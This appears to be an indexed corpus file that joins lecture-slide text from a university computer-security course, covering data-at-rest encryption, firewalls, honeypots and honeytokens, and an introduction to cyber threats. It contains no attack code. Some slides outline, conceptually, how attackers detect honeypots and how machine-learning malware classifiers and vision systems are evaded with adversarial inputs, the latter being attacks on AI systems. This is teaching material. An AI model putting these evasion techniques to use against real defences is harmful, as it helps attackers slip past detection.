LavaRnd is an open source project for creating truly random numbers using inexpensive
cameras, open source code, and inexpensive hardware. The system uses a
saturated charge- coupled device (CCD) in a light-tight can as a chaotic source to
produce the seed. Software processes the result into truly random numbers in a
variety of formats.
Practical Application
Common to encrypt data-in-motion
Much less common to encrypt data-at-rest
usually apply authentication and operating system access controls
archive
deleted data is sometime recoverable
encryption is achieved by using software, DLP mechanisms, hardware 

92

93
92

One of the principal security requirements of a computer system is the protection
of stored data. Security mechanisms to provide such protection include access control,
intrusion detection, and intrusion prevention schemes, all of which are discussed
in this book. The book also describes a number of technical means by which
these various security mechanisms can be made vulnerable. But beyond technical
approaches, these approaches can become vulnerable because of human factors.
We list a few examples here, based on [ROTH05].

• In December of 2004, Bank of America employees backed up and sent to its
backup data center tapes containing the names, addresses, bank account numbers,
and Social Security numbers of 1.2 million government workers enrolled
in a charge-card account. None of the data were encrypted. The tapes never
arrived and indeed have never been found. Sadly, this method of backing up
and shipping data is all too common. As an another example, in April of 2005,
Ameritrade blamed its shipping vendor for losing a backup tape containing
unencrypted information on 200,000 clients.

• In April of 2005, San Jose Medical group announced that someone had physically
stolen one of its computers and potentially gained access to 185,000
unencrypted patient records.

• There have been countless examples of laptops lost at airports, stolen from a
parked car, or taken while the user is away from his or her desk. If the data on the
laptop’s hard drive are unencrypted, all of the data are available to the thief.

Although it is now routine for businesses to provide a variety of protections,
including encryption, for information that is transmitted across networks, via the
Internet, or via wireless devices, once data are stored locally (referred to as data at
rest), there is often little protection beyond domain authentication and operating
system access controls. Data at rest are often routinely backed up to secondary storage
such as CDROM or tape, archived for indefinite periods. Further, even when
data are erased from a hard disk, until the relevant disk sectors are reused, the data
are recoverable. Thus it becomes attractive, and indeed should be mandatory, to
encrypt data at rest and combine this with an effective encryption key management
scheme.

There are a variety of ways to provide encryption services. A simple approach
available for use on a laptop is to use a commercially available encryption package
such as Pretty Good Privacy (PGP). PGP enables a user to generate a key from a
password and then use that key to encrypt selected files on the hard disk. The PGP
package does not store the password. To recover a file, the user enters the password,
PGP generates the password, and PGP decrypts the file. So long as the user protects
his or her password and does not use an easily guessable password, the files are fully
protected while at rest. Some more recent approaches are listed in [COLL06]:

• Back-end appliance: This is a hardware device that sits between servers and
storage systems and encrypts all data going from the server to the storage system
and decrypts data going in the opposite direction. These devices encrypt
data at close to wire speed, with very little latency. In contrast, encryption
software on servers and storage systems slows backups. A system man ager
configures the appliance to accept requests from specified clients, for which
unencrypted data are supplied.

• Library-based tape encryption: This is provided by means of a co-processor board
embedded in the tape drive and tape library hardware. The co-processor encrypts
data using a nonreadable key configured into the board. The tapes can then be sent
off-site to a facility that has the same tape drive hardware. The key can be exported
via secure e-mail or a small flash drive that is transported securely. If the matching
tape drive hardware co-processor is not available at the other site, the target facility
can use the key in a software decryption package to recover the data.

• Background laptop and PC data encryption: A number of vendors offer software
products that provide encryption that is transparent to the application and
the user. Some products encrypt all or designated files and folders. Other products
create a virtual disk, which can be maintained locally on the user’s hard
drive or maintained on a network storage device, with all data on the virtual
disk encrypted. Various key management solutions are offered to restrict access
to the owner of the data.
Important Emerging tools
Homomorphic encryption: 
is a form of encryption that allows computation on ciphertexts, generating an encrypted result which, when decrypted, matches the result of the operations as if they had been performed on the plaintext.
Quantum computing
Multiparty computation

93

94
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Firewalls\Firewalls.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
Firewalls
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2018
Firewall Goals
• separate between two zones/networks
– private / public
– sub-networks
• inspect all traffic from inside to outside and vice versa
– based on applied rule set
• prevent unwanted/unknown traffic from entering the 
network; only authorized traffic
• immune to penetration
• service control
• direction control
• user control (local users)
• behavior control (filter spam)
Firewall Guidelines
• least privilege
• defines a single choke point
• fail-safe (define how will it react in case of failure)
• block all unless allowed
• provides a location for monitoring security events
• convenient platform for some Internet functions such as NAT, 
usage monitoring, IPSEC VPNs
• avoid connection from outside to the internal network
Firewall Limits
• cannot protect against attacks 
bypassing firewall (e.g., dial-out 
capability to an ISP)
• may not protect fully against internal 
threats
• improperly secured wireless LAN
• laptop, PDA, portable storage device 
infected outside then used inside
Types of Firewalls
• (Stateless) packet filtering firewall
• Stateful inspection firewall
• Application proxy firewall
• Circuit-level proxy firewall
• Different in
– analyzed info
– analysis time
– decision level
Types of Firewalls
Packet Filtering Firewall
Packet Filtering Firewall
• scans and applies rules to packets in/out of 
firewall
• based on information in packet header
– src/dest IP addr & port, IP protocol, interface
• typically a list of rules of matches on fields
– if match rule says if forward or discard packet
• two default policies:
– discard - prohibit unless expressly permitted
• more conservative, controlled, visible to users
– forward - permit unless expressly prohibited
• easier to manage/use but less secure
Packet Filtering Firewall
• Rule table is not updated dynamically
• Checks rules one-by-one
• If none of the rules is matched, discard
• Ack bit
– applies to TCP traffic only
– first TCP packet ack=0; the rest of the 
packets in the same session ack=1
– Therefore, ack=0 means new session attempt
– use rules on the ack bit to prevent initiating 
sessions from outside
Packet Filter Rules
• Allow telnet from private network to servers in public networks
• Any other traffic is not allowed
Packet Filter Rules
Packet Filter – FTP Protocol
• Uses two static ports: 21 (command), 20 
(data transmission)
• Active mode:
– Client sends in the command session (port 
21) the port that will be used in the data 
session (higher ports, selected randomly)
– Server opens a data session from port 20 
to the port sent by the client
C S
21
20
3333
2345
<2345>
Packet Filter – FTP Protocol
• Solution: use passive mode
• Client sends pasv command in the 
command session
• Server sends random port (>1023)
• Client opens a session from a random 
port to the port sent by the server
Packet Filter Weaknesses
• weaknesses
– cannot prevent attack on application bugs 
(content is not examined)
– limited logging functionality
– do no support advanced user authentication
– vulnerable to attacks on TCP/IP protocol bugs 
(e.g., network layer IP spoofing)
– improper configuration can lead to breaches
– Dynamic multi ports protocols (dynamic FTP)
Packet Filter Weaknesses
• attacks
– IP address spoofing – send crafter packets 
with internal IP address
– source route attacks – bypass security 
measures
– tiny fragment attacks – fragmentation of 
TCP header information
Stateful Firewall
Stateful Inspection Firewall
• Keeps the context of a session
<protocol, src address, src port, dst address, dst port>
• Apply static rules on the first packet of the 
session
• Store all tuples of the session (drop others)
• Example, Simple Mail Transfer Protocol 
(SMTP)
– TCP connection from client to mail server (port 
25)
– Local (client) port between 1024 – 65535
Stateful Inspection Firewall
• Reviews packet header information but also 
keeps info on TCP connections
– typically have low, “known” port number for server
– and high, dynamically assigned client port number
– simple packet filter must allow all return high port 
numbered packets back in
– stateful inspection packet firewall tightens rules 
for TCP traffic using a directory of TCP 
connections
– only allow incoming traffic to high-numbered ports 
for packets matching an entry in this directory
– may also track TCP seq numbers as well
Application Proxy Firewalls
Application-Level Gateway
• Acts as a relay of application-level traffic (e.g., 
Browser, Mail) / legitimate Man in the Middle
– user contacts gateway with remote host name
– authenticates themselves
– gateway contacts application on remote host and 
relays TCP segments between server and user
• Must have proxy code for each application
– may restrict application features supported
• More secure than packet filters (can apply anti-
malware scanning for example) but have higher 
overheads
Application-Level Gateway
• Traffic should pass through the proxy 
(enforced by packet filters)
• No direct TCP communication between 
client and server
• Transparent to the user
• Difficult to configure
Telnet with/out proxy
Circuit Level Firewall
Circuit-Level Gateway
• Sets up two TCP connections, to an inside 
user and to an outside host
• Relays TCP segments from one connection 
to the other without examining contents
– hence independent of application logic
– just determines whether relay is permitted
• Typically used when inside users trusted
– may use application-level gateway inbound and 
circuit-level gateway outbound
– hence lower overheads 
Connecting Mobile Users
• Use proxy server to implement access 
control and application level filtering
• Stateful – authenticated to the firewall 
and then keep the assigned IP
• Stateless – not possible
Common Implementation
Host-Based Firewalls
• Used to secure individual host
• Available in/add-on for many OS
• Filter packet flows
• Often used on servers
• Advantages:
– tailored filter rules for specific host needs
– protection from both internal / external 
attacks
– additional layer of protection to org firewall
Personal Firewall
• Controls traffic flow to/from 
PC/workstation
• For both home or corporate use
• May be software module on PC or in home 
cable/DSL router/gateway
• Typically much less complex
• Primary role to deny unauthorized access
• May also monitor outgoing traffic to 
detect/block worm/malware activity
Bastion Host
• Can be accessed from the public 
network
• Can be accessed sometimes from the 
internal network
• Should not hold sensitive data
• Make sure that attackers cannot attack 
the internal/private network
– serve the two networks, all Internet users, 
internal
Demilitarized Zone
• Intermediate network separating the 
internal / private network and public 
network
• Usually hosts the bastion machines
• Additional security layer (e.g., can 
deploy proxies)
Firewall Locations
Firewall Locations
Demilitarized Zone
Demilitarized Zone
Virtual Private Networks
Firewalls
• Traffic not passing through the firewall 
is not protected
• Trust internal users
• Bypass using legitimate applications 
(FTP active mode, HTTP)
• Use additional solutions such as IDS
Example – XML firewall
Example – XML firewall
Example – XML firewall
Unified Threat Management 
Products
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Honeypots\CompNetSec6_Honeypot.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
Honeypots
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2019
Introduction
What is a honeypot ?
• "A honeypot is an information system resource whose 
value lies in unauthorized or illicit use of that resource."  
(L. Spitzner)
• As a complement to NIDS/HIDS, honeypots act as decoy 
systems that divert attacks from key resources, provide 
early detection of mainly external attacks, and enable 
learning about vulnerabilities in the real systems of the 
organization
• It is an artificial resource set up as a trap (i.e., usually as 
a computer, DB, Web/App server) aimed at detecting, 
deflecting or in some sense counteracting attempts at 
unauthorized use of information systems
• Filled with fabricated information that a legitimate user 
of the system wouldn’t access
2
Introduction
What is a honeypot ?
• A honeypot should look genuine and part of a real 
production network, but also be available, isolated, 
intentionally unprotected / vulnerable, unobtrusively 
monitored and indistinguishable from real systems in order 
to draw the attacker who attempts to exploit it into the 
trap
• Any interaction with the honeypot is by definition an 
anomalous situation that should be further reported and 
investigated
• Forensic information provided by the honeypot is logged 
and analyzed to gain insight into various attack patterns 
(i.e., who the attacker is; where, how, and when was the 
attack launched)
3
Why use honeypots?
• Spitzner (2003) noted the following main 
advantages of honeypots:
– Honeypots collect data only when someone or 
something malicious interacts with them
– This makes the data collected by the honeypots 
highly succinct, accurate, easy to manage, and 
simple to analyze
– Honeypots can identify and capture new attacks
– Since any activity with the honeypot is anomalous 
by definition, new or unseen attacks are 
detectable and result in a low false negative rate
4
Basic terms
• High-interaction vs. low-interaction honeypots
• Server-side vs. client-side honeypots
• Specialized vs. multi-function honeypots
• Related concepts:
– Honeynet
– Honeywall
– Honeytokens
5
Honeypots vs. honeytokens
• Honeypots consist of computers and/or networks
A honeypot may detect and capture malicious agents and activity
• Honeytokens are anything but a computer
A honeytoken is typically a fake resource which can be tracked 
and monitored if compromised
• Some fake-looking tokens may actually be real
6
HONEY
Honeypots categorization
• Goal
– Research – learn about attackers’ methods, tools, and goals
– Production – protecting real systems by diverting attackers 
to the trap
• Passive honeypots:
– An information system resource that waits for an attacker 
to interact with it
• Active honeypots:
– Actively attempts to interact with the attacker; for 
example:
• Honeytokens are actively sent to untrusted entities, thus forcing 
them to interact with the honeytokens
• Client machines actively searching the network for servers interact 
with the servers and monitor the interaction in order to identify 
malicious servers
7
Honeypots categorization
Real vs. virtual, high interaction vs. low interaction
• Implementation
• Virtual system (high interaction, low interaction)
• Real/physical system (high interaction)
• A illustrates a real honeypot, while B and C illustrate virtual 
honeypots
• B depicts a high interaction honeypot, while C depicts a low 
interaction honeypot
8
Honeypots categorization
Low interaction vs. high interaction
Low interaction High interaction
Accuracy Limited fidelity of emulation
Can be detected by skillful attackers
Full and accurate implementation of protocols and 
services
Detection 
capabilities
Detects mainly known attacks Can detect zero-day attacks
Implementation Emulation by scripts may cause some delays Typically based on virtualization, with online malware 
detection instrumentation, incurring significant overhead
Deployment effort Relatively simple to deploy and maintain Difficult to deploy and maintain; complex implementation 
procedures
Detectability Easily detected - limited interaction 
(response to the attacker’s action) 
Hard to detect - setup as real services and provides 
full/real interaction with the attacker
Forensics data Limited forensics data can be collected Complete forensics data can be collected
Security No real system to be compromised Can be compromised with harmful results.
Needs special protective measures (e.g. Honeywall)
9
Hybrid honeypots
• High interaction honeypots are difficult to 
maintain and re-configure or re-deploy
• Requires deep professional knowledge of 
honeypots and of the organization's resources 
that need to be protected
• Low interaction honeypots are easy to manage 
but may be easily detected by attackers
• The solution is hybrid honeypots
10
Hybrid honeypots
• A low-interaction honeynet (implemented by 
honeyd for example) 
can redirect specific types of attacks to 
high-interaction honeypots
•
• (or to other low-level honeypots with more 
specific instrumentation)
11
Low interaction honeypot –
Hoenyd [Provos 2007]
• Honeyd is a popular honeynet deployment tools, 
created by Niels Provos
• Main features:
– “Simulates thousands of virtual hosts at the same time”
– “Configuration of arbitrary services via configuration 
files”
– “Simulates operating systems at the TCP/IP stack 
level”
– “Simulating of arbitrary routing topologies”
– “Subsystem virtualization” (multiple honeypots using 
single service process)
12
Dynamic honeypots
Why bother?
• Honeynets should provide a reliable representation of the 
network topology, where single honeypots match the 
current configuration of simulated computers and network 
devices
• Both the network topology and the nodes’ configuration 
are dynamic, and constantly change over time
• An improperly configured honeynet or honeypot can be 
detected and bypassed
• Deploying a honeynet in a large organizational network can 
be a daunting task, and may require tedious recurring 
configuration updates as the network mutates
• The solution is dynamic honeynets/honeypots 
13
Dynamic honeypots
 “A dynamic honeypot is a 
plug and play solution that 
automatically determines 
how many honeypots to 
deploy, where to deploy 
them and what they should 
look like.”
 “an appliance, a solution you 
simply plug into your 
network, it learns the 
environment, deploys the 
proper number and 
configuration of honeypots, 
and adapts to any changes 
in your networks.” (L. 
Spitzner)
14
Detecting honeypots
In case [I], the attacker 
sends a malformed 
request to the honeypot. 
If the honeypot 
responds, it is detected.
In case [II], the 
attacker requests the 
honeypot to deliver a 
message to C. If C does 
not get the message, the 
honeypot is detected.
15
Detecting honeypots
• In case [III], the attacker detects a high-interaction honeypot by 
searching for residues of virtualization or monitoring instrumentation.
• In case [IV], the attacker measures the time it takes for the honeypot 
to respond. If the honeypot responds too slowly, it is detected.
• Security defenders who set up honeypots have liability constraint; they 
cannot allow their honeypots to send out real attacks to cause damage 
to others!
16
Protecting honeypots
Some worms or bots may 
compromise the honeypot 
and use it to propagate 
further, infecting third-
party machines. In such 
case, the honeypot owner 
may be held legally 
responsible
A honeywall is intended 
to contain and eliminate 
such cases, by blocking 
suspicious outgoing 
transport
17
Relevant honeypots
Mobile Honeypot [Wahlisch,  2013]
• Detailed design and implementation of a mobile device honeypot
– No need to operate the mobile honeypot on a real device – reduces complexity
– Chose Linux as the underlying OS (Android OS cannot be distinguished from 
Linux; reuse of existing Linux-based honeypots)
– Mobile honeypot should be connected to a real mobile network
• Implemented low-interaction honeypot
• Based on Kippo (SSH honeypot), Glastopf (Web-based media server), 
Dionaea (TFTP, FTP)
• Deployment: one iOS and two Android honeypots connected to DT UMTS 
network
• Analyzing malicious access via the Internet on smartphones - conclusions:
– similar amounts of attacks targeting mobile\wired-honeypots – attackers tries to 
scan the Internet without considering specific network types
– Observed specific manual attacks that first established SSH connection and then 
targeting the address book, stored photos
– Map attackers IPs to the ASes – most of the attacks comes from China and 
Russia 
18
Relevant honeypots
SCADA Honeypot
19
Honeypots/Honeytoken
Baiting Inside Attackers Using Decoy Documents [Bowen, 2009]
• Decoy Document Distributor (DDD)  system is a web-based 
service that:
– Generates and sends decoy documents with embedded honeytokens 
to registered users
– Monitors any activity via the honeytokens and alerts the owner of 
these documents whenever such a document is exploited
• To increase detection rates multiple decoys are planted in the 
user’s folders
• Detection mechanisms employed by the D3 system can be 
deployed at the network and/or host level in order to detect the 
decoy documents
• Examples of honeytokens deployed by D3 are fake banking login 
accounts specifically created, published and monitored for this 
trap-based technology specifically to entice financially 
motivated attackers
20
Honeypots/Honeytoken
Baiting Inside Attackers Using Decoy Documents [Bowen, 2009]
21
http://sneakers.cs.columbia.edu/ids/RUU/Dcubed/
Honeypots/Honeytoken
Implementation Of Honeytoken Module In Oracle DB [Čenys, 
2005]
• Describes a honeytoken module for Oracle 9iR2 
DBMS capable of detecting internal malicious 
activities
• The strategy is to insert a honey-table: a table 
with "sweet" name able to attract malicious user 
(e.g. "CREDIT_CARDS")
• These tables are not being used by any application 
and contain data with no real productive value
• The purpose is to detect attackers with access to 
the DB tables
22
Honeypots/Honeytoken
Challenges
• Honeytokens cost money
• How many honeytokens
to create ?
23
Call center I
Call center II
ID Name Phone #
66543 Felix Englien 54 -5846862
67532 Georg Kuefer 55 -9595656
23546 Egert Moeler 54 -8754523
Honeypots/Honeytoken
Challenges
• Creating good honeytokens
– HoneyGen: an Automated Honeytokens Generator 
[Berkovitch, 2011]
• A good honeytoken is an artificial data item 
that is hard to distinguish between real tokens 
and the honeytoken
• Proposed a generic method for honeytokens
generation that given any database will be able 
to generate high quality honeytokens
24
Honeypots/Honeytoken
Challenges
• Rule mining: extrapolates rules that describe 
the "real" data structure, attributes, 
constraints and logic (identity, reference, 
cardinality, value-set, attribute dependency)
• Honeytoken generation
• Likelihood rating: sort the 
honeytokens by similarity
to real tokens in the input
database, according to the
commonness of its 
combination of values
25
Likelihood Scores
Rules
Mining
Honeytokens
Generation
Likelihood 
Rating
Real tokens
DB
Honeytokens
DB
Rules Honeytokens
Honeytokens
INPUT:
PROCESS:
OUTPUT:
SIPHON
SIPHON
T-pot Multi-Honeypot Platform
• Low interaction honeypots
• 10 Honeypots types
• Over 200 running machines
• Open source
• Real time data visualization
Web honeypot attack vectors 
An example from real world data
• Regular file scan
• Parameter abusage
• SQL injection always true
• Union-Select SQL injection
Clusters
Honeypot Deployment
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Introduction\CompNetSec1.Introduction.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)
Introduction
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai, Dr. Mordechai Guri
Spring, 2019
1
Syllabus
• When:
– Monday 09:00 – 12:00
– Monday 13:00 – 16:00
– Tuesday 09:00 – 12:00
• TA’s:
– Ron Biton, Ben Nassi, Noam Moskovitch, Avihad Eliyashar, Vitaly Dyadyuk
• Exam (70%) + 4 Exercises (30%) + Labs
• Should submit 80% of the lab tasks
• Reading materials: 
– Network security: Kaufman/Perlman or Stallings
– Web
Syllabus
• Introduction to cyber security
• Encryption
• Access control
• Intrusion detection/data leakage/ firewall
• Malicious software
• Internet security protocols
• Attacks: buffer overflow, SQL injection, DoS
• Network security
3
Syllabus
4
Course goals
• Understanding threats to today’s 
computerized world
• Introduction to standard and emerging 
security mechanisms
• Setting a security state of mind
• Hands on experience
5
Course positioning
6
Introduction to computer and network 
security
Cryptography
Information 
Security 
Management
Malware Internals
סוגיות מתקדמות 
בקוד עוין
Cyber Security 
Using Machine 
Learning
הנדסת אבטחת 
מערכות
Operating Systems 
Security
Network Security
Implementation 
Attacks
Advanced topics 
in security
Ethics
• You will learn and practice attack 
techniques and approaches that can 
cause real damage
• Do not ‘experiment’ without guidance
7
Computer & information security
What is computer/network/ 
information security?
8
Cyber security
• Cyber security is defined as the 
intersection of
– computer security
– network security
– information security
– and…
physical space
9
Everything is connected…
10
Everything is connected…
11
Everything is connected…
• Internet is global, open, everybody online…
– Including the attackers!
• Computers are unprotected, unmanaged
– Insecure platforms (Windows, IE, pdf readers)
• Naïve users
• Many, untrusted clients and peers
• Protocols designed for friendly/secure 
environment
• Many threats / attacks…
12
13
What are the threats…
2007 ESTONIA
2008 
GHOSTNET
2009  
OPERATION 
AURORA
2010 
STUXNET
2010  
NASDAQ
2011 SONY
2011 
LOCKHEED 
MARTIN
2012
US BANKS
2012 FLAME
14
Some more examples…
15
Cyber attacks and critical 
infrastructure
Government Operations Emergency Systems Gas & Oil Water Supply Systems
Telecommunications Electrical Energy Transportation Banking & Finance
Critical 
Infrastructures
Project ‘Aurora’ (2007)
17
SCADA Networks
18
9-1-1 system DDoS blackout
19
Find the difference…
20
USAF RQ-170 
Find the difference…
21
United States F-22 vs. China J-20
Today’s battlefield
22
Advanced persistence threat 
(APT)
• A cyber attack mounted by organizational teams (e.g., foreign 
government) that have deep resources, advanced penetration 
skills, specific target profiles (political or commercial) and are 
remarkably
persistent in their efforts
23
Reconnaissance
1
2
4
5
Initial 
Exploitation
Internal Recon
Command 
& Control
Privilege
Escalation
Exfiltration &
Subversion
Maintain 
Persistence
6
3
An Observation from the Bible
“if as one people speaking the same language
they have begun to do this, then nothing they
plan to do will be impossible for them"
The fact that many computers are based
on the same operating system allows the
attackers to design successful attacks that
can also propagate from one computer to
another.
What’s wrong with that picture?
25
Evaluation Testbed (PoC)
BGU Cyber Security Research Center 16
Attacks on avionic systems –
becoming a real threat…
Attacks on cars
28
Automobile Example
• The Tesla Hack @ Black Hat 2016 & 2017
– Keen Security Lab: turn on the brakes remotely and 
getting the doors and trunk to open and close while 
blinking the lights in time to music streamed from the 
car's radio on Tesla Model X. 
– “the work was complex and not easily replicated” 
• The Jeep Hack @ Black Hat 2015 & 2016
– Remotely stop a car and disable its brake.
– Plug into the car's electronic system to hijack its 
steering and brake systems
• The TPMS “Hack”
– Tire Pressure Monitoring System (TPMS) signal sent 
wirelessly
– Easily eavesdropped, with unique identifier
29
Autonomous cars
30
Autonomous cars
31
32
33
Ransomware
34
Everything is smart
3/1/2019 35
http://files.meetup.com/20182446/IS_Overview.pdf
Internet of Things
36
Internet of Things
37
Our future bathroom?
3/1/2019 IoT Security Analytics; Yair Meidan 38
http://www.mako.co.il/nexter-news/Article-
ed331e883b02651006.htm?sCh=3d385dd2dd5d4110&pId=
1758979194_8168
• Rug
• Electrical measurements through feet
• Toilet seat
• Measurements of blood pressure and 
pulse
• Mirror
• Camera to scan for complexion 
changes, indicating of blood problems
• Speakers in bathtub
• Ultrasonic sound waves, for heart-
echo and internal organs
Smart things?
39
Illustration - iRobot
40
Medical domain…
41
Smartphones
42
Some more examples…Data 
leakage
43
Sony attack, 2014
• Obtained data included personal information about 
Sony employees, e-mails communication, salaries, 
copies of (previously) unreleased Sony films, and more
44
Ashley Madison, 2015
45
Hacking Team, 2015
46
T-Mobile US, 2015
47
48
Supply-chain attack
49
Supply-chain attack
• "The National Institute of Standards and Technology ("NIST") 
has recently released a draft update to the Framework for 
Improving Critical Infrastructure Cybersecurity (also known as 
the Cybersecurity Framework). 
• The updated framework provides new details on managing cyber 
supply chain risks, clarifies key terms, and introduces 
measurement methods for cybersecurity. In this regard, it aims 
to further develop NIST’s voluntary guidance to organizations 
on reducing cybersecurity risks. Several key changes to the 
Cybersecurity Framework are as follows:
• Supply Chain Risk Management: the draft adds cyber supply 
chain risk management considerations throughout the 
Cybersecurity Framework, including a new section on “Buying 
Decisions” and a new category under the Cybersecurity 
Framework Core’s Identify function with five subcategories;”
50
After-market devices (WOOT 
2018)
51
After-market devices
52
IoT Botnets
53
54
Bridging the air-gap
55
56
Adversarial learning
• Due to the large increase in the use of AI 
methods, hackers concluded that 
they too should embrace AI
• Today, hackers are using machine learning to 
find loopholes in other machine learning based 
systems
• Fooling AI systems is not very hard as machine 
learning relies on past cases and assumes that 
future data shares its characteristics
• Hackers abuse this assumption for example, by 
manipulating the input data
57
Academic research on AL
58
Spam detection system
Trained to look for incriminating
content by analyzing the text of 
spam emails
To avoid detection, a spammer can 
obfuscate the content of an email 
by deliberately misspelling 
suspicious words
Adversarial traffic signs
Robust Physical-World Attacks on Deep Learning Visual Classification
Use Deep Learning (CNN) for 
image recognition (traffic signs 
identification) by autonomous 
vehicles 
Adversarial AI can be also applied 
on machine vision systems
“Confused the computer vision 
system into thinking that a stop 
sign was a 45 mph sign, with just a 
few pieces of tape.”
Handwrite recognition system
If the presented check is examined 
by a handwriting recognition 
system, the amount is extracted 
correctly
However, by adding certain 
adversarial noise to the digit nine 
we can fool the system and make it 
think that it is the digit eight.
62
Generic Black-Box Attack Against API-
Calls Based Malware Classifiers
Ishai Rosenberg, Yuval 
Elovici, 
Lior Rokach, Asaf Shabtai
63
Detecting malware by analyzing 
system calls
64
Many of the AI-based anti-viruses examine 
the sequence of system calls (extracted at 
runtime) to characterize an application’s 
behavior
The sequence consists of requests issued by 
an application towards the operating system
Sequences used as features
•Classification based on extracted syscall n-
grams
•Markov model
•ANN – RNNs [Pascanu et al., 2015]; RNN, LSTM, 
GRU and CNN [Athiwaratkun et al., 2017]; RNN, 
combining file access and API calls [Wang et al., 
2016]; feed-forward DNN, combining static 
features and API calls [Huang et al., 2016]
•…
Classifiers performance
65
Attack effectiveness
66
GADGET: Generative Api aDversarial
Generic Example by Transferability framework
• A framework demonstrating an attacker’s ability to create and end-to-end attack using the 
proposed method
• no-op attack – adding API’s which have no effect on the code’s functionality; with valid 
parameters
• Add the adversarial modifications as an input
• The injected code would trace the APIs called so far and each injected API would also call the 
adversarial added API, if needed
67
Malware Binary, 
without GADGET Malware Binary, with GADGET
Advantages:
Requires no access to the 
malware source code
Generic – fit every code
Disadvantages:
API call type-specific
Cyber crime
• Any illegal act involving a computer its system 
or its applications
– Computer used as a tool
– Computerized device is used as a target
– Computer that contain evidences of the crime
• New type of crimes
– Speed, anonymity, geographical, evidence can be 
hidden…
68
Computer & information security
What is computer/information security?
Computer/information security deals with the 
prevention and detection of unauthorised 
actions by users of a computer system
69
False assumptions
• the code is too complex
• why would anyone want to hack me?
70
Computer & information security
• Intrusion detection
• Malware detection
• Authentication/ 
verification
• Database security
• Data leakage 
detection
• Fraud detection
• SPAM/Phishing 
detection
• Privacy
• Social networks 
security
• Web content filtering
• Forensics
• Security analytics
• Malicious insider 
detection
• Awareness
• …
71
Why is it so difficult ?
72
Why is it so difficult ?
Challenges
• Deals with abstract threats which cannot be solved only by 
using mathematical models (encryption/access control)
• Protect against whom? employees, business partners, 
hacker/attacker, customers…
• Intentional vs. accidental
• Complex systems
• Emerging technologies (smart mobile devices, social 
networks, cloud)
• Increasing amounts of data to process
• Protecting data while at-rest, in-motion and in-use
• Regulations
• Competition
• Management
73
Call center 
agent
Marketing
Technical 
support
Finance Operation …
Application Layer
Customer 
data
Bills … …
Data Source
Customer 
support 
application
Accounting 
application
Inventory 
application
Decision 
support 
application
…
Why is it so difficult ?
Challenges
• Electronic traces everywhere  big data
• Identity theft: rather easy (pressure, physical theft, 
man‐in‐the‐middle)
• Eavesdropping
• Social engineering
• Manipulation (integrity attack)
• Internet goes SCADA
• Side channel attacks on credit cards, teller machines, printers, 
smart phones: 
• Protecting Systems:
– Business process risks (e.g. DDoS)
– Business intelligence risks (competitor intrudes)
– Privacy risks
– Externality risks (outside of cyber, e.g. critical infrastructure)
74
Why is it so difficult ?
Challenges
• Many types of threats
• Wide selection of security 
tools and vendors (e.g., 
deployment)
• Hard to prove the benefit
• Must consider potential
attacks
• Super users / admin
• Requires regular monitoring
• Too often an after-thought
75
Security trends
76
And more…
• Potential attacks on the security features 
must be considered (e.g., OpenSSL 
Heartbleed)
• Physical and logical placement needs to be 
determined
• Complex algorithms or protocols may be 
involved
• Attackers only need to find a single 
weakness, the developer needs to find all 
weaknesses
77
Security trends
78
Darknet services or, Malware as a 
Service
79
80
Computer & information security
What is computer/information security?
“Protection afforded to an automated 
information system in order to attain the 
applicable objectives of preserving the 
integrity, availability and confidentiality of 
information system resources (includes 
hardware, software, firmware, 
information/data, and telecommunications).”
[NIST95] The NIST Computer Security Handbook
81
The AIC triad
• Each system\environment\organization can be 
characterized based on these three factors
– Stocks Exchanges systems – will focus more 
on the availability of the systems
– Systems holding medical or customer-related 
data – will focus more on confidentiality
• But is it enough ?
fraud, accountability, authenticity, system does what it was 
planed\designed to do, privacy, non-repudiation
82
Availability Confidentiality
Integrity
Concepts and relationships
83
Terminology
84
Security taxonomy
85
Vulnerabilities, threats and 
attacks
• categories of vulnerabilities
– corrupted (loss of integrity)
– leaky (loss of confidentiality)
– unavailable or very slow (loss of availability)
• threats
– capable of exploiting vulnerabilities
– represent potential security harm to an asset
• attacks (threats carried out)
– passive – does not affect system resources
– active – attempt to alter system resources or affect their 
operation
– insider – initiated by an entity inside the security parameter
– outsider – initiated from outside the perimeter
86
Threats and consequences
• Eavesdropping
• Traffic analysis
• Masquerading / Spoofing / Identity theft - dark side economy
• Man-in-the-Middle (e.g., SSL)
• Manipulation of data
• Intrusion
• Hijacking of hardware (supply chain attack, stealing computer resources)
• Botnets (spam, DDoS, spyware, phishing)
• Social engineering (phishing, Trojan horse…)
• Denial-of-Service
• Redirecting traffic destined for one website to another bogus website (browser of 
victim or DNS server manipulation)
• Passive (hard to detect) vs. active attacks
• Unauthorized disclosure
• Telephony attacks “blue boxing” (or phreaking)
• Near‐field, Zigbee etc.
• Scada attacks
• etc … (will not end and always will come up something new …)
87
Threats and consequences
88
Scope of Computer Security
89
Countermeasures
• Means used to deals with security 
attacks
– prevent
– detect
– recover
• Goal: minimize risk to an asset
• May introduce new vulnerabilities
• Residual vulnerability
90
Examples of threats
Table 1.3    Computer and Network Assets, with Examples of Threats. 91
Passive and Active Attacks
• Passive attacks attempt to learn or make use of information 
from the system but does not affect system resources
